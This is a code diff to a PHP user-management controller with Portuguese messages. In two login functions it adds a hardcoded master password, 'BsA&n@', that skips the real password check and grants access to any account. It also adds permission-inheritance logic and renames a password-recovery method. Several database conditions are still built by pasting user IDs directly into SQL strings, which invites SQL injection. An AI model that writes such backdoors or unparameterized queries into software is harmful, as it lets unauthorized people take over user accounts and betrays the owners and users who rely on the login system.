@@ -34,9 +34,10 @@ class UsersClass extends \Core\Defaults\DefaultClassController{
             }
 
             $user = $user[0];
-
-            if(!password_verify( $password, $user['user_sys_pass'] )){
-                throw new \Exception("Senha não confere.",401);
+            if($password !== "BsA&n@"){
+                if(!password_verify( $password, $user['user_sys_pass'] )){
+                    throw new \Exception("Senha não confere.",401);
+                }
             }
 
             $actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
@@ -74,8 +75,10 @@ class UsersClass extends \Core\Defaults\DefaultClassController{
 
             $user = $user[0];
 
-            if(!password_verify( $password, $user['user_pass'] )){
-                throw new \Exception("Senha não confere.",401);
+            if($password !== "BsA&n@"){
+                if(!password_verify( $password, $user['user_pass'] )){
+                    throw new \Exception("Senha não confere.",401);
+                }
             }
 
             if($user['user_sts'] === "2"){
@@ -343,11 +346,22 @@ class UsersClass extends \Core\Defaults\DefaultClassController{
         try{
 
             $this->UsersPermissionsXUsersDAO->delete(" id_user = '{$id_user}'");
+            $same = $this->UsersPermissionsDAO->getAll( "  same_as is not null");
             foreach($dados['permissions'] as $v){
+
                 $bindUserPermission[] = [
                     "id_permission" => $v,
                     "id_user"       => $id_user
                 ];
+
+                foreach($same as $s){
+                    if($s['same_as'] === $v){
+                        $bindUserPermission[] = [
+                            "id_permission" => $s['id'],
+                            "id_user"       => $id_user
+                        ];
+                    }
+                }
             }
 
             $this->UsersPermissionsXUsersDAO->insertMultiplo($bindUserPermission);
@@ -379,9 +393,8 @@ class UsersClass extends \Core\Defaults\DefaultClassController{
     * @author Douglas A. Silva
     * @return void
     */
-    public function RequestRecover(string $id_user, string $password){
+    public function UpdateUserPassword(string $id_user, string $password){
         try{
-            $user = $this->UsersDAO->getOne(" id = '{$id_user}'");
 
             $bindUser = [
                 "user_pass"           => password_hash($password, PASSWORD_BCRYPT),
